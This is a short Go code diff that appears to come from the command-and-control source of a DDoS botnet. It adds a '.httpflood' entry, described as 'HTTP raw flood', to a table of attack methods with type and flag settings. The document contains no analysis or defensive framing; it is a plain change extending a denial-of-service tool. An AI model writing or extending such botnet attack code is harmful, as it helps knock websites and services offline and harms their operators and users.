@@ -203,6 +203,11 @@ var Methods map[string]*Method = map[string]*Method{
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
+	".httpflood": {
+		Type:        11,
+		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 8, 20, 21, 22},
+		Description: "HTTP raw flood",
+	},
 }
 
 // MethodsFromMapToArray will take all the methods from the map and convert into an array
